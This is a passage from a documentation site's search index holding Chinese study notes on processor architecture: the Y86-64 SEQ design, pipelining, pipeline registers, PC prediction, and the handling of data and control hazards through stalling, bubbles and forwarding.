<p>\u200b\u6ce8\u610f\u200b\u8fd9\u91cc\u200b popq \u200b\u6709\u200b\u4e24\u4e2a\u200b\u5199\u200b\u5bc4\u5b58\u5668\u200b\u64cd\u4f5c\u200b, \u200b\u6267\u884c\u200b\u987a\u5e8f\u200b\u662f\u200b\u5148\u200b\u5199\u200b valE, \u200b\u518d\u200b\u5199\u200b valM. \u200b\u8fd9\u200b\u4e00\u70b9\u200b\u5728\u200b\u540e\u9762\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b.</p> <p>\u200b\u4ece\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u200b\u7684\u200b\u5177\u4f53\u200b\u6267\u884c\u200b\u9636\u6bb5\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u4e3a\u4ec0\u4e48\u200b pushq %rsp, popq %rsp \u200b\u7684\u200b\u884c\u4e3a\u200b\u662f\u200b\u90a3\u6837\u200b\u7684\u200b.</p> <p></p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#432-seq","title":"4.3.2 SEQ \u200b\u786c\u4ef6\u200b\u7ed3\u6784","text":"<p> - \u200b\u767d\u8272\u200b\u65b9\u6846\u200b\u8868\u793a\u200b\u65f6\u949f\u200b\u5bc4\u5b58\u5668\u200b: PC \u200b\u662f\u200b SEQ \u200b\u4e2d\u200b\u552f\u4e00\u200b\u7684\u200b\u65f6\u949f\u200b\u5bc4\u5b58\u5668\u200b - \u200b\u6d45\u200b\u7070\u8272\u200b\u8868\u793a\u200b\u786c\u4ef6\u200b\u5355\u5143\u200b, \u200b\u5982\u200b\u5185\u5b58\u200b, ALU, \u200b\u6211\u4eec\u200b\u5c06\u200b\u5b83\u4eec\u200b\u770b\u6210\u200b\u9ed1\u76d2\u5b50\u200b. - \u200b\u63a7\u5236\u200b\u903b\u8f91\u200b\u7528\u200b\u7070\u8272\u200b\u5706\u89d2\u200b\u77e9\u5f62\u200b\u8868\u793a\u200b. - \u200b\u767d\u8272\u200b\u5706\u5708\u200b\u662f\u200b\u4fe1\u53f7\u200b\u7684\u200b\u540d\u5b57\u200b - \u200b\u5bbd\u5ea6\u200b\u4e3a\u200b\u5b57\u957f\u200b\u7684\u200b\u6570\u636e\u200b\u7528\u200b\u4e2d\u7b49\u200b\u7c97\u5ea6\u200b\u7684\u200b\u7ebf\u200b\u8868\u793a\u200b - \u200b\u5bbd\u5ea6\u200b\u4e3a\u200b\u5b57\u8282\u200b\u6216\u200b\u66f4\u200b\u7a84\u200b\u7684\u200b\u6570\u636e\u200b\u7528\u200b\u7ec6\u7ebf\u200b\u8868\u793a\u200b - \u200b\u5355\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u8fde\u63a5\u200b\u7528\u200b\u865a\u7ebf\u200b\u8868\u793a\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#433-seq","title":"4.3.3 SEQ \u200b\u7684\u200b\u65f6\u5e8f","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5f00\u59cb\u200b\u65f6\u200b, \u200b\u72b6\u6001\u200b\u5355\u5143\u200b\u662f\u200b\u6839\u636e\u200b\u524d\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\u7684\u200b. (\u200b\u4e0a\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u524d\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4ea7\u751f\u200b\u51fa\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b, \u200b\u8fd9\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u5199\u5165\u200b)</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#434-seq","title":"4.3.4 SEQ \u200b\u7684\u200b\u5b9e\u73b0","text":"<p>\u200b\u53c2\u89c1\u200b seq_std.rs</p> <p>\u200b\u672c\u8d28\u200b\u4e0a\u200b\u662f\u200b\u7406\u89e3\u200b\u524d\u9762\u200b\u5404\u4e2a\u200b\u6307\u4ee4\u200b\u7684\u200b\u5404\u4e2a\u200b\u9636\u6bb5\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#44","title":"4.4 \u200b\u6d41\u6c34\u7ebf\u200b\u901a\u7528\u200b\u539f\u7406","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#441","title":"4.4.1 \u200b\u8ba1\u7b97\u200b\u6d41\u6c34\u7ebf","text":"<p>\u200b\u541e\u5410\u91cf\u200b: \u200b\u6bcf\u79d2\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u6570\u200b</p> <p>\u200b\u5ef6\u8fdf\u200b: \u200b\u6267\u884c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b</p> <p> \u200b\u8fd9\u4e2a\u200b\u672a\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b\u7684\u200b\u8bbe\u8ba1\u200b - \u200b\u541e\u5410\u91cf\u200b\u4e3a\u200b 1/320ps = 3.12GIPS (GIPS\u200b\u662f\u200b\u6bcf\u79d2\u200b\u5343\u5146\u200b\u6761\u200b\u6307\u4ee4\u200b, \u200b\u5373\u200b10^9) - \u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 320ps.</p> <p> \u200b\u901a\u8fc7\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b - \u200b\u541e\u5410\u91cf\u200b\u4e3a\u200b 1/120ps=8.33GIPS  - \u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 3*120ps=360ps</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u541e\u5410\u91cf\u200b\u589e\u52a0\u200b, \u200b\u5ef6\u8fdf\u200b\u4e5f\u200b\u7a0d\u5fae\u200b\u589e\u52a0\u200b, \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u6bcf\u200b\u5212\u5206\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u9636\u6bb5\u200b\u90fd\u200b\u9700\u8981\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u4fdd\u5b58\u200b\u8fd9\u4e2a\u200b\u9636\u6bb5\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u7684\u200b\u503c\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#442","title":"4.4.2 \u200b\u6d41\u6c34\u7ebf\u200b\u7684\u200b\u5c40\u9650\u6027","text":"<ul> <li>\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5fc5\u987b\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u5ef6\u8fdf\u200b\u6700\u9ad8\u200b\u7684\u200b\u90a3\u4e2a\u200b\u9636\u6bb5\u200b.</li> <li>\u200b\u6d41\u6c34\u7ebf\u200b\u8fc7\u6df1\u200b, \u200b\u5ef6\u8fdf\u200b\u8fc7\u9ad8\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#45-y86-64","title":"4.5 Y86-64 \u200b\u7684\u200b\u6d41\u6c34\u7ebf\u200b\u5b9e\u73b0","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#451-seq","title":"4.5.1 SEQ+: \u200b\u91cd\u65b0\u5b89\u6392\u200b\u8ba1\u7b97\u200b\u9636\u6bb5","text":"<p>\u200b\u79fb\u52a8\u200b PC \u200b\u66f4\u65b0\u200b\u9636\u6bb5\u200b, \u200b\u4f7f\u200b\u5b83\u200b\u5728\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5f00\u59cb\u200b\u65f6\u200b\u6267\u884c\u200b, \u200b\u8fd9\u6837\u200b\u65b9\u4fbf\u200b\u6211\u4eec\u200b\u8fdb\u884c\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b, \u200b\u56e0\u4e3a\u200b\u6d41\u6c34\u7ebf\u200b\u8981\u200b\u4e00\u76f4\u200b\u53d6\u51fa\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b. </p> <p>SEQ -&gt; SEQ+ \u200b\u662f\u200b\u4e00\u4e2a\u200b\u5f88\u200b\u901a\u7528\u200b\u7684\u200b\u6539\u8fdb\u200b\u7684\u200b\u4f8b\u5b50\u200b, \u200b\u8fd9\u79cd\u200b\u6539\u8fdb\u200b\u79f0\u4e3a\u200b\u7535\u8def\u200b\u91cd\u200b\u5b9a\u65f6\u200b. \u200b\u91cd\u200b\u5b9a\u65f6\u200b\u6539\u53d8\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7cfb\u7edf\u200b\u7684\u200b\u72b6\u6001\u200b\u8868\u793a\u200b\u4f46\u200b\u4e0d\u200b\u6539\u53d8\u200b\u5b83\u200b\u7684\u200b\u903b\u8f91\u200b\u884c\u4e3a\u200b, \u200b\u901a\u5e38\u200b\u7528\u200b\u5b83\u200b\u6765\u200b\u5e73\u8861\u200b\u4e00\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u5404\u4e2a\u200b\u9636\u6bb5\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5ef6\u8fdf\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#452","title":"4.5.2 \u200b\u63d2\u5165\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668","text":"<p>PIPE-  \u200b\u8fd9\u91cc\u200b\u9ed1\u8272\u200b\u7684\u200b\u65b9\u6846\u200b\u4ee3\u8868\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u6bcf\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u6709\u200b\u591a\u4e2a\u200b\u5b57\u200b\u6bb5\u200b, \u200b\u7528\u200b\u767d\u8272\u200b\u65b9\u6846\u200b\u8868\u793a\u200b.</p> <p>\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668\u200b\u6309\u200b\u5982\u4e0b\u200b\u65b9\u5f0f\u200b\u7f16\u53f7\u200b: - F: \u200b\u4fdd\u5b58\u200bPC\u200b\u7684\u200b\u9884\u6d4b\u503c\u200b - D: \u200b\u4f4d\u4e8e\u200b\u53d6\u6307\u200b\u548c\u200b\u8bd1\u7801\u200b\u4e4b\u95f4\u200b, \u200b\u4fdd\u5b58\u200b\u6700\u65b0\u200b\u53d6\u51fa\u200b\u7684\u200b\u6307\u4ee4\u200b\u4fe1\u606f\u200b, \u200b\u5373\u5c06\u200b\u7531\u200b\u8bd1\u7801\u200b\u9636\u6bb5\u200b\u5904\u7406\u200b. - E: \u200b\u8bd1\u7801\u200b\u548c\u200b\u6267\u884c\u200b\u4e4b\u95f4\u200b. - M: \u200b\u6267\u884c\u200b\u548c\u200b\u8bbf\u5b58\u200b\u4e4b\u95f4\u200b. - W: \u200b\u8bbf\u5b58\u200b\u548c\u200b\u53cd\u9988\u200b\u8def\u5f84\u200b\u4e4b\u95f4\u200b. \u200b\u53cd\u9988\u200b\u8def\u5f84\u200b\u6267\u884c\u200b\u5bc4\u5b58\u5668\u200b\u5199\u200b, ret \u200b\u64cd\u4f5c\u200b\u8fd8\u8981\u200b\u4e3a\u200b PC \u200b\u63d0\u4f9b\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#453","title":"4.5.3 \u200b\u5bf9\u200b\u4fe1\u53f7\u200b\u91cd\u65b0\u6392\u5217\u200b\u548c\u200b\u6807\u53f7","text":"<p>\u200b\u4f7f\u7528\u200b\u5927\u5199\u5b57\u6bcd\u200b\u5f00\u5934\u200b\u4ee3\u8868\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668\u200b\u5185\u200b\u7684\u200b\u5185\u5bb9\u200b, \u200b\u5c0f\u5199\u5b57\u6bcd\u200b\u8868\u793a\u200b\u6bcf\u4e2a\u200b\u9636\u6bb5\u200b\u521a\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u4fe1\u53f7\u200b</p> <p>\u200b\u56e0\u4e3a\u200b\u53ea\u6709\u200b call \u200b\u548c\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b valP \u200b\u7684\u200b\u503c\u200b, \u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b\u53c8\u200b\u90fd\u200b\u4e0d\u200b\u9700\u8981\u200b valA \u200b\u7684\u200b\u503c\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u5427\u200b valP \u200b\u5408\u5e76\u200b\u5230\u200b valA \u200b\u4fe1\u53f7\u200b\u4e2d\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#454-pc","title":"4.5.4 \u200b\u9884\u6d4b\u200b PC","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4f1a\u200b\u5b9e\u73b0\u200b\u63a7\u5236\u200b\u8f6c\u79fb\u200b\u7684\u200b\u6307\u4ee4\u200b, \u200b\u6211\u4eec\u200b\u6709\u200b\u5982\u4e0b\u200b\u65b9\u5f0f\u200b\u9884\u6d4b\u200b: - call: \u200b\u603b\u662f\u200b valC - jmp: \u200b\u603b\u662f\u200b valC - jXX: \u200b\u603b\u662f\u200b\u9884\u6d4b\u200b\u9009\u62e9\u200b\u5206\u652f\u200b, \u200b\u5373\u200b valC - ret: \u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u9884\u6d4b\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u7b80\u5355\u200b\u7684\u200b\u5c06\u200b\u6d41\u6c34\u7ebf\u200b\u6682\u505c\u200b\u5904\u7406\u200b\u65b0\u200b\u6307\u4ee4\u200b, \u200b\u76f4\u5230\u200b\u6211\u4eec\u200b\u4ece\u6808\u200b\u4e2d\u200b\u53d6\u51fa\u200b\u4e86\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#455","title":"4.5.5 \u200b\u6d41\u6c34\u7ebf\u200b\u5192\u9669","text":"<p>\u200b\u5f53\u200b\u76f8\u90bb\u200b\u7684\u200b\u6307\u4ee4\u200b\u51fa\u73b0\u200b\u4e00\u4e9b\u200b\u76f8\u5173\u200b\u65f6\u200b, \u200b\u7531\u4e8e\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u5bfc\u81f4\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u63d0\u524d\u200b\u5f97\u77e5\u200b\u67d0\u4e9b\u200b\u6570\u636e\u200b\u7684\u200b\u4fe1\u606f\u200b\u6216\u8005\u200b\u5bf9\u200b\u67d0\u4e9b\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u66f4\u6539\u200b, \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5192\u9669\u200b. \u200b\u5192\u9669\u200b\u5206\u4e3a\u200b\u6570\u636e\u200b\u5192\u9669\u200b\u548c\u200b\u63a7\u5236\u200b\u5192\u9669\u200b.</p> <p>\u200b\u6570\u636e\u200b\u5192\u9669\u200b:</p> <p></p> <p>\u200b\u5728\u200b 0x017 addq \u200b\u547d\u4ee4\u200b\u8fdb\u5165\u200bD\u200b\u9636\u6bb5\u200b\u65f6\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bfb\u5165\u200b %rdx \u200b\u548c\u200b %rax \u200b\u7684\u200b\u6570\u636e\u200b, \u200b\u5728\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\u4e2d\u200b %rdx \u200b\u548c\u200b %rax \u200b\u5df2\u7ecf\u200b\u6267\u884c\u200b\u5b8c\u200b\u4e86\u200b\u5199\u200b\u56de\u200b(W) \u200b\u9636\u6bb5\u200b, \u200b\u6240\u4ee5\u200b\u4e0d\u4f1a\u200b\u9020\u6210\u200b\u6570\u636e\u200b\u5192\u9669\u200b.</p> <p></p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u53ea\u6709\u200b 2 \u200b\u4e2a\u200b nop \u200b\u6307\u4ee4\u200b\u7684\u200b\u793a\u4f8b\u200b\u4e2d\u200b, 0x016 \u200b\u5904\u200b\u7684\u200b addq \u200b\u5728\u200b D \u200b\u9636\u6bb5\u200b\u51c6\u5907\u200b\u8bfb\u5165\u200b %rax \u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b, %rax \u200b\u7684\u200b\u65b0\u200b\u5185\u5bb9\u200b\u8fd8\u200b\u672a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b(\u200b\u56e0\u4e3a\u200b\u8981\u200b\u7b49\u200b W \u200b\u9636\u6bb5\u200b\u6267\u884c\u200b\u5b8c\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u624d\u200b\u4f1a\u200b\u5199\u5165\u200b), \u200b\u8fd9\u200b\u5c31\u200b\u9020\u6210\u200b\u4e86\u200b\u6211\u4eec\u200b\u8bfb\u51fa\u200b\u7684\u200b\u662f\u200b %rax \u200b\u7684\u200b\u65e7\u503c\u200b.</p> <p>\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\u8bf4\u660e\u200b, \u200b\u5982\u679c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u88ab\u200b\u5b83\u200b\u524d\u9762\u200b\u4e09\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u6761\u200b\u4fee\u6539\u200b\u7684\u8bdd\u200b, \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6570\u636e\u200b\u5192\u9669\u200b.</p> <p>Note</p> <p>\u200b\u901a\u8fc7\u200b\u5bf9\u200b\u6570\u636e\u200b\u5192\u9669\u200b\u7c7b\u578b\u200b\u7684\u200b\u5217\u4e3e\u200b, \u200b\u5047\u8bbe\u200b\u7a0b\u5e8f\u200b\u4e0d\u4f1a\u200b\u81ea\u6211\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u51fa\u200b\u6211\u4eec\u200b\u53ea\u200b\u9700\u8981\u200b\u5904\u7406\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\u5192\u9669\u200b, \u200b\u63a7\u5236\u200b\u5192\u9669\u200b, \u200b\u4ee5\u53ca\u200b\u6b63\u786e\u5904\u7406\u200b\u5f02\u5e38\u200b.</p> <p>\u200b\u7528\u200b\u6682\u505c\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u5192\u9669\u200b:</p> <p>\u200b\u6682\u505c\u200b\u548c\u200b\u6c14\u6ce1\u200b\u662f\u200b\u914d\u5408\u200b\u4f7f\u7528\u200b\u7684\u200b. \u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6682\u505c\u200b\u7684\u200b\u9636\u6bb5\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u80fd\u200b\u7ee7\u7eed\u6267\u884c\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u8981\u200b\u63d2\u5165\u200b\u6c14\u6ce1\u200b bubble \u200b\u5b9e\u73b0\u200b nop(\u200b\u4e0d\u200b\u4fee\u6539\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b)   \u200b\u8fd9\u91cc\u200b F, D \u200b\u9636\u6bb5\u200b stall, E \u200b\u9636\u6bb5\u200b\u63d2\u5165\u200b\u4e00\u4e2a\u200b bubble</p> <p>\u200b\u7528\u200b\u8f6c\u53d1\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u5192\u9669\u200b:</p> <p>\u200b\u6682\u505c\u200b\u7684\u200b\u4ee3\u4ef7\u200b\u592a\u200b\u5927\u200b, \u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u5176\u5b9e\u200b %rax, %rdx \u200b\u7684\u200b\u65b0\u503c\u200b\u5728\u200b E \u200b\u9636\u6bb5\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u4e86\u200b, \u200b\u4f46\u662f\u200b\u5230\u200b W \u200b\u9636\u6bb5\u200b\u624d\u200b\u5199\u200b\u56de\u200b. \u200b\u6240\u4ee5\u200b\u4e0d\u5982\u200b\u5728\u200b E \u200b\u9636\u6bb5\u200b\u76f4\u63a5\u200b\u5c06\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u503c\u200b\u8f6c\u53d1\u200b\u5230\u200b addq \u200b\u7684\u200b D \u200b\u9636\u6bb5\u200b.</p> <p>\u200b\u901a\u8fc7\u200b\u8f6c\u53d1\u200b  - e_valE: E\u200b\u9636\u6bb5\u200b\u521a\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u503c\u200b - m_valM: M\u200b\u9636\u6bb5\u200b\u521a\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u51fa\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u503c\u200b - M_valE: M\u200b\u9636\u6bb5\u200b\u4fdd\u5b58\u200b\u7684\u200bE\u200b\u9636\u6bb5\u200b\u8fd8\u200b\u672a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b - W_valM: W\u200b\u9636\u6bb5\u200b\u8fd8\u200b\u672a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b - W_valE: W\u200b\u9636\u6bb5\u200b\u8fd8\u200b\u672a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b E \u200b\u9636\u6bb5\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u503c\u200b.</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u5bf9\u4e8e\u200b\u521a\u521a\u200b\u90a3\u4e2a\u200b\u4f8b\u5b50\u200b. \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b nop, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8f6c\u53d1\u200b e_valE \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u7684\u200b\u65b0\u200b %rax \u200b\u5230\u200b addq \u200b\u7684\u200b valA \u200b\u4e2d\u200b. \u200b\u5982\u679c\u200b\u6709\u200b\u4e00\u4e2a\u200b nop, \u200b\u5bf9\u200b %rax \u200b\u7684\u200b\u66f4\u65b0\u200b\u6765\u5230\u200b\u4e86\u200b M \u200b\u9636\u6bb5\u200b, M_valE \u200b\u4fdd\u5b58\u200b\u4e86\u200b %rax \u200b\u7684\u200b\u65b0\u503c\u200b, \u200b\u53ef\u4ee5\u200b\u8f6c\u53d1\u200b. \u200b\u5982\u679c\u200b\u6709\u200b\u4e24\u4e2a\u200b nop, \u200b\u5bf9\u200b %rax \u200b\u7684\u200b\u66f4\u65b0\u200b\u6765\u5230\u200b\u4e86\u200b W \u200b\u9636\u6bb5\u200b, W_valE \u200b\u4fdd\u5b58\u200b\u4e86\u200b %rax \u200b\u7684\u200b\u65b0\u503c\u200b, \u200b\u53ef\u4ee5\u200b\u8f6c\u53d1\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u6b63\u786e\u5904\u7406\u200b\u4e86\u200b\u6570\u636e\u200b\u5192\u9669\u200b.</p> <p>\u200b\u52a0\u8f7d\u200b/\u200b\u4f7f\u7528\u200b\u6570\u636e\u200b\u5192\u9669\u200b:</p> <p>\u200b\u6709\u200b\u4e00\u7c7b\u200b\u6570\u636e\u200b\u5192\u9669\u200b\u4e0d\u80fd\u200b\u5355\u7eaf\u200b\u4f7f\u7528\u200b\u8f6c\u53d1\u200b\u6765\u200b\u89e3\u51b3\u200b, \u200b\u56e0\u4e3a\u200b\u8fd9\u200b\u7c7b\u200b\u6570\u636e\u200b\u7684\u200b\u65b0\u503c\u200b\u4e0d\u662f\u200b\u5728\u200b E \u200b\u9636\u6bb5\u200b\u800c\u662f\u200b\u5230\u200b M \u200b\u9636\u6bb5\u200b\u624d\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u88ab\u200b\u8bfb\u51fa\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u5229\u7528\u200b e_valE \u200b\u5b9e\u73b0\u200b\u76f8\u90bb\u200b\u6307\u4ee4\u200b\u4e4b\u95f4\u200b\u6ca1\u6709\u200b nop \u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u4e86\u200b.</p> <p>\u200b\u6240\u4ee5\u200b\u5bf9\u4e8e\u200b\u4e0a\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u6570\u636e\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b, \u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7acb\u523b\u200b\u4f7f\u7528\u200b\u8be5\u200b\u5bc4\u5b58\u5668\u200b\u503c\u200b\u4f5c\u4e3a\u200b\u6e90\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u6307\u4ee4\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u63d2\u5165\u200b\u4e00\u4e2a\u200b bubble. \u200b\u8fd9\u6837\u200b\u5230\u200b M \u200b\u9636\u6bb5\u200b\u5185\u5b58\u200b\u91cc\u200b\u7684\u200b\u503c\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8bfb\u51fa\u6765\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u8f6c\u53d1\u200b\u5230\u200b D \u200b\u9636\u6bb5\u200b\u4e2d\u200b. </p> <p>\u200b\u907f\u514d\u200b\u63a7\u5236\u200b\u5192\u9669\u200b:</p> <p>\u200b\u5f53\u200b\u5904\u7406\u5668\u200b\u65e0\u6cd5\u200b\u6839\u636e\u200b\u53d6\u6307\u200b\u9636\u6bb5\u200b\u7684\u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u6765\u200b\u786e\u5b9a\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u65f6\u200b, \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u63a7\u5236\u200b\u5192\u9669\u200b. \u200b\u63a7\u5236\u200b\u5192\u9669\u200b\u53ea\u4f1a\u200b\u53d1\u751f\u200b\u5728\u200b\u6761\u4ef6\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u548c\u200b ret \u200b\u6307\u4ee4\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b ret \u200b\u6307\u4ee4\u200b, \u200b\u6211\u4eec\u200b\u53ea\u80fd\u200b\u7b49\u5f85\u200b\u5b83\u200b\u5230\u8fbe\u200b W \u200b\u9636\u6bb5\u200b\u4f7f\u7528\u200b W_valM \u200b\u66f4\u65b0\u200b PC. \u200b\u56e0\u6b64\u200b\u4e2d\u95f4\u200b\u8981\u200b\u63d2\u5165\u200b\u4e09\u4e2a\u200b bubble. </p> <p></p> <p>Note</p> <p>\u200b\u867d\u7136\u200b\u8ba9\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u7ee7\u7eed\u6267\u884c\u200b\u5230\u200b D \u200b\u9636\u6bb5\u200b\u4e0d\u4f1a\u200b\u6539\u53d8\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b, \u200b\u4f46\u662f\u200b\u6700\u540e\u200b\u6211\u4eec\u200b\u8fd8\u662f\u200b\u8981\u200b\u901a\u8fc7\u200b bubble \u200b\u53d6\u6d88\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b(\u200b\u53ef\u4ee5\u200b\u53c2\u89c1\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u7684\u200b\u5904\u7406\u200b\u65b9\u5f0f\u200b), \u200b\u6240\u4ee5\u200b\u4e0d\u5982\u200b\u76f4\u63a5\u200b\u4e0d\u53d6\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b, \u200b\u5728\u200b F \u200b\u9636\u6bb5\u200b\u63d2\u5165\u200b bubble. </p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u5728\u200b m_valM \u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u8f6c\u53d1\u200b\u5230\u200b PC \u200b\u4e2d\u200b?</p> 